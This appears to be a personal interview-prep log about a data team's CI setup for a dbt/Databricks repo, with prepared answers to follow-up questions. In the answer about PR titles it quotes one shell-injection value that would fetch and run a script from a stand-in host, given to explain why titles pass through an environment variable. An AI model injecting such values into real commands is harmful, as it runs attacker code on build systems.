# Interview log

One entry per ticket, written before you close it.

## Ticket NN: title

- **Decision:**
- **Rejected alternative and why:**
- **Impact (numbers where you can):**
- **Hardest moment and how you got past it:**

## Ticket 01: Repo skeleton and CI gates

- **Decision:** Every change to the pipeline has to pass 13 automated checks before it can merge, and they run before anything touches Databricks. They cover SQL style (sqlfluff), Python bugs and types, tests, leaked credentials and vulnerable dependencies. Each check is its own job, so a red check says exactly which rule broke. On a data team, a bad dbt model doesn't fail loudly: it writes wrong numbers into a Gold table that a dashboard reads. Catching it at the PR is the cheapest place to stop it.
- **Rejected alternative and why:** I could have relied on code review alone and added checks later. Reviewers miss mechanical things like an inconsistently formatted model, an unpinned dependency or a pasted warehouse token, and the checks cost nothing to run on a public repo. I also rejected one big CI job: when a single job fails, you have to read the logs to find out why.
- **Impact (numbers where you can):** The gates are 13 checks and 31 tests, with coverage at 93% (floor 90) and a mutation score of 90.5% (19 of 21 deliberate bugs caught, floor 85). The dependency audit found 0 known vulnerabilities across 132 locked packages. A planted fake API key was caught by gitleaks (1 leak found, PR blocked). The full suite runs in a few minutes on every PR.
- **Hardest moment and how you got past it:** The SQL linter hung forever in CI. sqlfluff's dbt templater renders each model through dbt, and dbt-databricks opens a real warehouse connection to do it, so with placeholder credentials it waited indefinitely. A stack dump showed it stuck building dbt's relation cache. For now the lint passes because there are no models yet. Once models land, the lint job will need dev warehouse credentials. The other option is the plain Jinja templater, which needs no connection but renders macros less faithfully.

### Likely follow-up questions

- **Why does a data engineer care about CI?** dbt models are code that produces data. A broken model in production means wrong numbers in reports, and a backfill to fix them. Linting and testing at the PR is much cheaper than a data incident.
- **What's mutation testing?** The tool deliberately breaks the code, for example flipping `==` to `!=`, and checks whether a test fails. If no test fails, the tests aren't really checking that line. Coverage only says a line ran; mutation testing says a test would notice if it were wrong.
- **Why pin actions and dependencies to exact versions?** Reproducibility. The same commit should build the same way next month. It's the same idea as pinning a dbt package version so a model's output doesn't change underneath you. Pinning GitHub Actions to a commit SHA also stops a compromised tag from running someone else's code with access to your secrets.
- **Why pass the PR title through `env:`?** Anyone who opens a PR controls its title. Pasted straight into a shell command, a title like `"; curl evil.sh | sh` would run. As an environment variable it is only ever treated as text.
- **Why a lock file (`uv.lock`) and `--locked`?** The lock file records every package version. `--locked` fails CI if the lock file is out of date, so the versions audited are the versions that actually run.
- **What would you improve?** gitleaks-action only scans the commits the PR's commits API lists, so running the gitleaks binary over the full commit range would close that gap. Bundle validation waits for the Databricks workspace in ticket 02.
